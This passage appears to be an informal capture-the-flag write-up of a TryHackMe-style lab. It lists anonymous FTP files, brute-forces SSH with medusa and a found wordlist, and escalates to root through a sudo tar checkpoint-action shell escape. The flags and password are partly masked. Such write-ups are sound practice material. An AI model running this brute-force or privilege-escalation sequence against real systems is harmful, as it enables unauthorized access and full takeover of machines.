Here, we found two text files.

-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt

  *task.txt ( may be hint )
  
#Brute-Force
  Here it played well,..lol .I tried creating custom wordlist with username as show in crew picture but it doesn't seems to work and then i figured out task file with as name called as lin.
  Again lol.. hydra was not working fine ( may be update reason )
  so, i tried medusa and metasploit.
  
  └──╼ $medusa -U lin -P locks.txt -h 10.10.54.3 -M ssh
    ACCOUNT FOUND: [ssh] Host: 10.10.54.3 User: lin Password: R***************3 [SUCCESS]
  
  Atlast, i got the combination. 
  
#ssh
  
  └──╼ $ssh lin@10.10.54.3
  lin@bountyhacker:~/Desktop$ ls -al
    #user.txt
      cat user.txt
      THM{C**********3}
      
     #root.txt
      first, tried with sudo -l
      User lin may run the following commands on bountyhacker:
      (root) /bin/tar
      It seems we can with lin as with sudo privilage.
      
        *sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        tar: Removing leading `/' from member names
          # id
          uid=0(root) gid=0(root) groups=0(root)
          # cat /root/root.txt
